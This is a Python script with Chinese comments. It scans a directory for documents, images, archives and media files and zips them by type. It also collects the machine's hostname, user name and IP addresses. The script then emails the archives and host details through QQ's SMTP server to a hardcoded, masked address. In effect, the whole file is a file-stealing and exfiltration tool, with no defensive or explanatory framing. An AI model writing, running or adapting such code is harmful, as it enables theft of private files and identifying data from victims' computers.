
# -*- coding:utf-8 -*-
import os,zipfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase 
from email.mime.text import MIMEText
from email import encoders 
from datetime import date
from email.header import Header
import sys,socket
import getpass
import time

keylist = ['txt','doc','docx','pdf','zip','rar','jpg','gif','png','bmp','mp4','mp3']
result=[]
result_txt = []
result_doc = []
result_docx = []
result_pdf = []

result_zip = []
result_rar = []

result_jpg = []
result_gif = []
result_png = []
result_bmp = []

result_mp4 = []
result_mp3 = []
#-----------------------------------------------------函数定义部分
#目录遍历函数
def SearchPath(path):
    for folder,subFolders,files in os.walk(path):
        for file in files:#文件分析
            AnalyzeFile(folder,file)
        for subFolder in subFolders:#递归遍历
            SearchPath(subFolder)     
#文件分析，是否包含指定字符串，是否压缩文件中包含keyword
def AnalyzeFile(folder,filename):
    # if file.endswith(keyword): #文件名中包含关键字
    #     result.append(folder+"\\"+file)

    if filename.endswith('.txt') :
        result_txt.append(folder+"\\"+filename)
    if filename.endswith('.doc') :
        result_doc.append(folder+"\\"+filename)
    if filename.endswith('.docx') :
        result_docx.append(folder+"\\"+filename)
    if filename.endswith('.pdf') :
        result_pdf.append(folder+"\\"+filename)

    if filename.endswith('.zip') :
        result_zip.append(folder+"\\"+filename)
    if filename.endswith('.rar') :
        result_rar.append(folder+"\\"+filename)

    if filename.endswith('.jpg') :
        result_jpg.append(folder+"\\"+filename)
    if filename.endswith('.gif') :
        result_gif.append(folder+"\\"+filename)
    if filename.endswith('.png') :
        result_png.append(folder+"\\"+filename)
    if filename.endswith('.bmp') :
        result_bmp.append(folder+"\\"+filename)

    if filename.endswith('.mp4') :
        result_mp4.append(folder+"\\"+filename)
    if filename.endswith('.mp3') :
        result_mp3.append(folder+"\\"+filename)
       
        

#-----------------------------------------------------程序流程部分

dir = "*******"#路径

#开始检索
print("开始检索["+dir+"]目录下的文件")
#遍历
SearchPath(dir)
#输出
if result_txt:
    resultzip = zipfile.ZipFile(dir+'_txt.zip','w')
    for i in result_txt:
        resultzip.write(i)
if result_doc:
    resultzip = zipfile.ZipFile(dir+'_doc.zip','w')
    for i in result_doc:
        resultzip.write(i)
if result_docx:
    resultzip = zipfile.ZipFile(dir+'_docx.zip','w')
    for i in result_docx:
        resultzip.write(i)
if result_pdf:
    resultzip = zipfile.ZipFile(dir+'_pdf.zip','w')
    for i in result_pdf:
        resultzip.write(i)

if result_zip:
    resultzip = zipfile.ZipFile(dir+'_zip.zip','w')
    for i in result_zip:
        resultzip.write(i)
if result_rar:
    resultzip = zipfile.ZipFile(dir+'_rar.zip','w')
    for i in result_rar:
        resultzip.write(i)

if result_jpg:
    resultzip = zipfile.ZipFile(dir+'_jpg.zip','w')
    for i in result_jpg:
        resultzip.write(i)
if result_gif:
    resultzip = zipfile.ZipFile(dir+'_gif.zip','w')
    for i in result_gif:
        resultzip.write(i)
if result_png:
    resultzip = zipfile.ZipFile(dir+'_png.zip','w')
    for i in result_png:
        resultzip.write(i)
if result_bmp:
    resultzip = zipfile.ZipFile(dir+'_bmp.zip','w')
    for i in result_bmp:
        resultzip.write(i)

if result_mp4:
    resultzip = zipfile.ZipFile(dir+'_mp4.zip','w')
    for i in result_mp4:
        resultzip.write(i)
if result_mp3:
    resultzip = zipfile.ZipFile(dir+'_mp3.zip','w')
    for i in result_mp3:
        resultzip.write(i)

print('result_txt: ',result_txt)
print('result_doc: ',result_doc)
print('result_docx: ',result_docx)
print('result_pdf: ',result_pdf)

print('result_zip: ',result_zip)
print('result_rar: ',result_rar)

print('result_jpg: ',result_jpg)
print('result_gif: ',result_gif)
print('result_png: ',result_png)
print('result_bmp: ',result_bmp)

print('result_mp4: ',result_mp4)
print('result_mp3: ',result_mp3)




def getToday():
    today = date.today()
    date_today = today.strftime("%m%d")
    return date_today

def server(msg):
    #服务器
    mail_host = "smtp.qq.com"
    mail_user = "***********@qq.com"
    mail_pass = "**************"#认证码

    server = "***********@qq.com"
    receiver = ["***********@qq.com"]
    #receiver = ["***********@qq.com"]
    try:
        smtpobj = smtplib.SMTP()
        smtpobj.connect(mail_host,25)
        smtpobj.login(mail_user,mail_pass)
        smtpobj.send_message(msg)
        print("sccessfully!")
    except smtplib.SMTPException:
        print('Error！')


    

def send():
    #创建带附件实例
    for x in ('txt','doc','docx','png','rar'):
        message = MIMEMultipart()
        message['From'] = "***********@qq.com"
        message['To'] = "***********@qq.com"
        #message['To'] = "***********@qq.com"
        subject = "Python SMTP 邮件"+getToday()
        message['Subject'] = Header(subject,'utf-8')
        message.attach(MIMEText(host_computer()))
        with open (dir+"_"+x+".zip",'rb') as f:
            letter = MIMEBase('zip','zip',filename=dir+"_"+x+".zip")
            letter.add_header('Content-Disposition','attachment',filename=('gb2312', '', dir+"_"+x+".zip"))
            letter.add_header('Content-ID','<0>')
            letter.add_header('X-Attachment-Id','0')
            letter.set_payload(f.read())
            encoders.encode_base64(letter)
            message.attach(letter)
        server(message)

  

def getipaddrs(hostname):
    result=socket.getaddrinfo(hostname,None,0,socket.SOCK_STREAM)
    return [x[4][0] for x in result]
def host_computer():
    hostname=socket.gethostname()
    Fully_qualified_name = socket.getfqdn(hostname)
    user_name = getpass.getuser() # 获取当前用户名
    IP_address =""
    for x in range(0,len(getipaddrs(hostname))):
        IP_address = IP_address +"\n"+ ''.join(getipaddrs(hostname)[x])
    return "hostname is:"+hostname+'\n'+ "Fully_qualified name:"+socket.getfqdn(hostname)+'\n'+"当前用户名:"+user_name+'\n'+"IP address:"+IP_address


if __name__ == '__main__':
    send()